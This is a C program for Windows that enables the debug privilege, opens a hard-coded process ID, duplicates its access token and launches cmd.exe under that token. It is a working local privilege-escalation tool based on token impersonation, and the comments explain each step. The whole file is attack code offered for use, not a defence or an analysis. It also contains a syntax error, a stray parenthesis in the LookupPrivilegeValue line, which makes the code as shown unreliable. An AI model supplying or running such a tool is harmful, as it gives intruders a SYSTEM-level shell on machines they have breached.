#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib") //library "advapi32.lib" contains the Advanced Windows API's functions used in this program

void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){
    // used to modify the access token of the calling process to grant or revoke specific privileges
    // handle to the access token (hToken), the name of the privilege as a string (lpszPrivilege),
    //Boolean value indicating whether to enable or disable the privilege (bEnablePrivilege)

    TOKEN_PRIVILEGES tp;
    LUID luid; //

    LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) // (locally unique identifier) The LUID is used by the os's security subsystem to
                                                          // determine an object's access rights, such as the right to run a process or the right to access a particular file.
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges() Failed :(");
    }
    printf("Privileges enabled! ;)\n");
}
int main()
{
    int pid_to_impersonate = 776; // the process id we want to intergate and get privilage
    HANDLE TokenHandle = NULL;
    HANDLE DuplicateTokenHandle = NULL;
    STARTUPINFO startupInfo; //"startupInfo" and "processInformation" structures used to launch a new process
    PROCESS_INFORMATION processInformation;//declare a variable "processInformation" of type "PROCESS_INFORMATION", initialize it with zeros using the "ZeroMemory" function.
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);
    
    HANDLE CurrentTokenHandle = NULL;
    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);
    if (!getCurrentToken)
    {
        printf("Couldn't retrieve current process token ;(\n");
        printf("Error code : %d", GetLastError());
    }
    EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);
    // "EnablePrivileges" function is called with the current access token and the "SE_DEBUG_NAME"
    //privilege to grant the "debug" privilege to the process

    HANDLE rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);
    if (!rProc)
    {
        printf("OpenProcess() Failed ;(\n");
        printf("Error code : %d", GetLastError());
    }
    BOOL rToken = OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
    if (!rToken)
    {
        printf("OpenProcessToken() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
    }
    BOOL ImpersonateUser = ImpersonateLoggedOnUser(TokenHandle);
    //  "ImpersonateLoggedOnUser" function is called with the retrieved access token to impersonate the user associated with the target process.
    if (!ImpersonateUser)
    {
        printf("ImpersonateLoggedOnUser() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
    }

    if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle))
        //"DuplicateTokenEx" function is called with the impersonated access token to create a duplicate token that can be used to launch a new process.
    {
        printf("DuplicateTokenEx() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
    }

    if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation))
        // "CreateProcessWithTokenW" function is called with the duplicate token and the path to the "cmd.exe" executable to launch a new process with elevated privileges
    {
        printf("CreateProcessWithTokenW() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());

    }
    return 0;
}
